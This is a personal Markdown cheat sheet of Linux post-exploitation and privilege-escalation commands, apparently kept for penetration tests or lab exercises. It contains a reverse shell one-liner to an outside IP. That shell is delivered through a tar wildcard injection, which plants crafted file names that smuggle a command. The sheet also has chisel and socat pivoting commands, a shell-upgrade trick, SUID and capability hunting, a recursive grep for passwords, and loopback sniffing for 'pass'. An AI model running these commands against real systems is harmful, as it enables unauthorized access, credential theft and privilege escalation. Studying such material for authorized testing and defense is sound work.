- always check the `$PATH` value!
- some [check list](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- Siren's [notes](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)
- restricted shell bypass [hacktricks](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/) , [exploit-db](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
```bash
## General notes
# List systemd timers
systemctl list-timers
# port binding using ssh | localPort:socket:remotePort
ssh -L 4444:127.0.0.1:8080 soraka@172.17.0.2
# -- pivoting --
chisel server -p 3477 --socks5 --reverse
chisel client 10.10.10.10:3477 R:5000:socks
# file transfer using /dev/tcp
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
## 
exec 3<>/dev/tcp/$host/4444
cat <&3

```
##### upgrade shell
```bash
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || script -qc /bin/bash /dev/null
# Ctrl+Z
stty raw -echo;fg ; reset
stty columns 200 rows 200

```
##### exports
```bash

export TERM=linux
export TERM=xterm-256color
stty columns 156 rows 40
alias l='ls -lav --ignore=.?*'
alias la='ls -lav --color=auto'
alias ll='ls -lav --ignore=..'
alias ls='ls --color=auto'
alias ll='ls -lsaht --color=auto'
cd(){ pwd; builtin cd "$@"; pwd; ls -F; }
shopt -s autocd
function cd(){
    builtin cd "$@" && ls
}
chpwd() ls
chr() {
  printf \\$(printf '%03o' $1)
}

ord() {
  printf '%d' "'$1"
}



export PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:$PATH"


```
- Tunneling/Port forwarding
```sh
# redirect all in (:2345) out to (:5432)
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.202.215:5432


```
###### container enumerate
```bash
grep 'docker\|lxc' /proc/1/cgroup
mount  # show filesystem mount
df   # filesystem usage
```
##### manual enumeration
```bash
# os/version
cat /etc/issue
cat /etc/os-release

# network socket
ss -lntp # -n don't resolve service name
ss -ltp
ss -anp
cat /etc/iptables/rules.v4
routel
# grep recursive 
grep -i -R password .
# find for files/folders owned by a user
find / -user soraka 2>/dev/null
# read secondary permissions
lsattr
# find suid/guid
find / -perm -4000 -type f ! -path "/dev/*" 2>/dev/null
find / -perm -2000 -type f ! -path "/dev/*" 2>/dev/null
find / -user root -perm -4000 -exec ls -la {} \; 2> /dev/null
find / -perm /6000 2>/dev/null
# get caps
getcap -r / 2>/dev/null | head -n 50 
# others
lsblk
lsmod
/sbin/modinfo libata
# always monitor network in pentest
sudo tcpdump -i lo -A | grep "pass"
# cronjobs
grep "CRON" /var/log/syslog
# check AppArmor
aa-status
```
- uniqe exploitations
```bash
# tar wildcard
echo "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```
ruby [priv esc](https://ihsansencan.github.io/privilege-escalation/linux/binaries/ruby.html)
##### kernels archives:
- [alpine](https://dl-cdn.alpinelinux.org/alpine/) linux archive
- [voidlinux](https://repo-default.voidlinux.org/live/) archive
- [nixos](https://releases.nixos.org/)


folders to check
```bash
/tmp/
/dev/shm/
/home/
/opt/
/etc/
/var/mail/
/var/www/
/


```
files to check
```bash
/etc/fstab
```